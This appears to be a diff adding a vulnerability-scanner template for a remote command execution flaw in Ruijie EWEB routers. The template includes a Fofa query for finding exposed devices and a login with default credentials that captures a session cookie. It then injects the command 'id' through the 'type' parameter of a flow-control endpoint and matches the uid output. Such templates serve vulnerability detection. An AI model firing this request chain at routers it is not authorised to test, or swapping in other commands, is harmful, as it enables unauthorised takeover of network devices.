@@ -1,0 +1,35 @@
+id: ruijie-route-control-rce
+
+info:
+  name: 锐捷EWEB路由器 control.php 远程命令执行漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |
+    锐捷EWEB路由器 control.php 存在远程命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
+    Fofa: title="锐捷网络-EWEB网管系统"
+  reference:
+    - https://cn-sec.com/archives/4353567.html
+  tags: ruijie,router,rce
+  created: 2025/8/11
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ddi/server/login.php
+      body: username=admin&password=admin?
+    expression: response.status == 200 && response.headers['set-cookie'].icontains("ruijieid")
+    output:
+      search: '"Set-Cookie: (?P<cookie>.*?);".bsubmatch(response.raw_header)'
+      cookie: search["cookie"]
+
+  r1:
+    request:
+      method: POST
+      path: /flow_control_pi/flwo.control.php?a=getFlowGroup
+      headers:
+        Cookie: "{{cookie}}"
+      body: type=;id;
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0() && r1()
